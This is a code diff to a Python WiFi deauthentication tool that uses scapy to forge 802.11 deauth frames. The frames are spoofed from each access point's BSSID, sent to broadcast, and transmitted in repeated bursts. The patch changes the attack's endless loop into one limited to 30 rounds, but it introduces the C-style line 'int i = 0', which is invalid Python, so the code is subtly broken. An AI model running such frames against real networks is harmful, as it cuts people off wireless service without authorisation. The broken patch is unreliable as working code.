@@ -32,8 +32,8 @@ class Deauth(object):
             self.burst = 10
         if len(self.APs) >= 7:
             self.burst = 3
-
-        while True:
+        int i = 0
+        while i<30:
             for bssid in self.APs:
                 packet = Dot11(addr1=self.BROADCAST, addr2=bssid, addr3=bssid) / Dot11Deauth()
                 channel = self.APs[bssid]
@@ -47,7 +47,7 @@ class Deauth(object):
                 
                 print("[{G}+{N}] {pkt} frames sent to {Y}{bssid}{N}".format(pkt=self.burst, G=GREEN, N=NORMAL, Y=YELLOW, bssid=bssid.upper()))
                 sleep(1)
-
+            i = i+1
 class DeauthAll(object):
     def __init__(self, interface):
         self.interface = interface
